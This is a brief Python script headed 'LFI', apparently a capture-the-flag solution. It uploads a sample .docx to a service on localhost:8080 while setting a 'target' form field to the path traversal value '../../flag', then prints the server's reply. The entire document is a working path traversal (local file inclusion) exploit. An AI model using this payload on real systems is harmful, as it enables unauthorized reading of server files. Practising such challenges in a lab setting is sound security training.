# LFI

import requests

url = "http://localhost:8080"

files = {'file':open('./file/sample/sample.docx', 'rb')}
data = {'target':'../../flag'}

r = requests.post(url, files=files, data=data)
print(r.text)